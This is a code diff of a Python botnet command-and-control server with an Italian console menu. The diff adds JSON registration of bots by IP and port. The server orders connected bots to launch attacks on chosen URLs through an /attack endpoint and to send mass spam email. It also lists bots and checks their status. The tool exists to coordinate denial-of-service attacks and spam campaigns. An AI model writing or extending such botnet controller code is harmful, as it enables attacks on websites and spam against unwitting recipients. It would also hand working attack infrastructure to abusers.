@@ -1,4 +1,5 @@
 import concurrent
+import json
 import socket
 from asyncio import Event
 from concurrent.futures import ThreadPoolExecutor
@@ -23,13 +24,17 @@ def initialize(e):
             client, address = s.accept()
             data = client.recv(1024)
 
+            data = json.loads(data.decode('utf-8'))
+
+            bot = (address[0], data['port'])
+
             print("--------------------------------------")
             if address[0] not in clients:
-                clients.append(address[0])
-                print(f"Bot connected: {data.decode('utf-8')}")
+                clients.append(bot)
+                print(f"Bot connected: {bot}")
             else:
-                clients.remove(address[0])
-                print(f"Bot disconnected: {data.decode('utf-8')}")
+                clients.remove(bot)
+                print(f"Bot disconnected: {bot}")
             print("--------------------------------------")
         except socket.timeout:
             continue
@@ -62,6 +67,7 @@ def handle_console(e):
         print("4. Mostra informazioni di un client")
         print("5. Avvia mail spam")
         print("6. Controlla lo stato dei bot")
+        print("7. Verifica se i bot sono attivi")
         print("0. Exit")
         scelta = int(input())
 
@@ -81,6 +87,8 @@ def handle_console(e):
             mail_spam()
         elif scelta == 6:
             bot_status()
+        elif scelta == 7:
+            check_bot_is_active()
         else:
             print("Scelta non valida")
 
@@ -90,11 +98,17 @@ def get_all_clients():
     Print all the clients connected to the server
     """
     if len(clients) == 0:
+        print("--------------------------------------")
         print("Nessun bot connesso")
+        print("--------------------------------------")
         return
 
+    print("--------------------------------------")
+    print("Numero di bot connessi: ", len(clients))
+    print("--------------------------------------")
     for key, client in enumerate(clients):
-        print(f'Client {key + 1}: {client}')
+        print(f'Bot {key + 1}: {client}')
+        print("--------------------------------------")
 
 
 def send_http_request():
@@ -117,12 +131,9 @@ def send_http_request():
         if scelta == 1:
             for url in urls:
                 for client in clients:
-                    requests.post(f"http://{client}/attack", json={
+                    requests.post(f"http://{client[0]}:{client[1]}/attack", json={
                         'url': url
                     })
-                    # requests.post(f"http://{client[1][0]}:8080/attack", json={
-                    #     'url': url
-                    # })
 
         else:
             print("Seleziona un URL da attaccare: ")
@@ -131,7 +142,7 @@ def send_http_request():
 
             url = urls[int(input()) - 1]
 
-            find_bot(path='attack', method="POST", json={
+            find_bot(path='attack', method="POST", j={
                 'url': url
             })
 
@@ -166,10 +177,10 @@ def mail_spam():
             "mail_object": mail_object,
             "number_of_emails": number_of_mails
         }
-        find_bot(path='mail-spam', method="POST", json=data)
+        find_bot(path='mail-spam', method="POST", j=data)
 
 
-def find_bot(path, method, json=None):
+def find_bot(path, method, j=None):
     if len(clients) == 0:
         print("Nessun bot connesso")
         return
@@ -177,28 +188,25 @@ def find_bot(path, method, json=None):
     if input("Voi utilizzare tutti i bot connessi? S/N: ") in ["S", "s"]:
         if method == "GET":
             for client in clients:
-                res = requests.get(f"http://{client}/{path}")
-                # res = requests.get(f"http://{client[1][0]}:8080/{path}")
+                res = requests.get(f"http://{client[0]}:{client[1]}/{path}")
                 if path == "client-info":
                     print_client_info(client, res)
         elif method == "POST":
             for client in clients:
-                requests.post(f"http://{client}/{path}", json=json)
-                # requests.post(f"http://{client[1][0]}:8080/{path}", json=json)
+                requests.post(f"http://{client[0]}:{client[1]}/{path}", json=j)
     else:
         client_ip = input("Inserisci l'Ip del bot di cui vuoi sapere le info: ")
-        if client_ip not in clients:
+        c = next((client for client in clients if client[0] == client_ip), None)
+        if c is None:
             print("Bot non trovato")
             return
         else:
             if method == "GET":
-                res = requests.get(f"http://{client_ip}/{path}")
-                # res = requests.get(f"http://{client_ip}:8080/{path}")
+                res = requests.get(f"http://{c[0]}:{c[1]}/{path}")
                 if path == "/client-info":
-                    print_client_info(client_ip, res)
+                    print_client_info(c[0], res)
             elif method == "POST":
-                requests.post(f"http://{client_ip}/{path}", json=json)
-                # requests.post(f"http://{client_ip}:8080/{path}", json=json)
+                requests.post(f"http://{c[0]}:{c[1]}/{path}", json=j)
 
 
 def bot_status():
@@ -207,8 +215,7 @@ def bot_status():
     """
     for client in clients:
         try:
-            res = requests.get(f"http://{client}/status")
-            # requests.get(f"http://{client}:8080/ststus")
+            res = requests.get(f"http://{client[0]}:{client[1]}/status")
 
             print(f"Bot: {client}")
             print(f"Operation: {res.json()['operation']}")
@@ -225,7 +232,6 @@ def check_bot_is_active():
     for client in clients:
         try:
             requests.get(f"http://{client}/status")
-            # requests.get(f"http://{ip}:8080/status")
             print(f"Bot: {client} attivo")
         except requests.exceptions.ConnectionError:
             print(f"Bot {client} disconnesso")
